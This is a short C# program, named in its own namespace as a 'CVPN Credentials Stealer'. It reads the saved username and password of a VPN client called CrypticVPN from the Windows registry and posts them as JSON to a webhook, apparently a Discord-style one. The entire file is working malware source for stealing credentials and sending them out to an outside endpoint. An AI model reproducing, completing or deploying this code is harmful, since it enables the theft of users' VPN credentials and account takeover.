using Microsoft.Win32;
using System;
using System.IO;
using System.Net;
using System.Text;

namespace CVPN_Credentials_Stealer
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string credentials = String.Format("{0}:{1}", getCrypticVPN("Username"), getCrypticVPN("Password"));
            sendCredentials("webhook", credentials);
        }

        static string getCrypticVPN(string hw)
        {
            RegistryKey RK = Registry.CurrentUser.OpenSubKey("Software\\CrypticVPN", false);
            return RK.GetValue(hw).ToString();
        }

        private static void sendCredentials(string uri, string creds)
        {
            string[] credsSplit = creds.Split(':');
            WebRequest request = WebRequest.Create(uri);
            request.Method = "POST";
            string postData = "{\"content\": \"https://github.com/HideakiAtsuyo\\nCredentials:\\n\\nUsername: " + credsSplit[0] + "\\nPassword: " + credsSplit[1] + "\"}";
            byte[] byteArray = Encoding.UTF8.GetBytes(postData);
            request.ContentType = "application/json";
            request.ContentLength = byteArray.Length;
            Stream dataStream = request.GetRequestStream();
            dataStream.Write(byteArray, 0, byteArray.Length);
            dataStream.Close();
        }
    }
}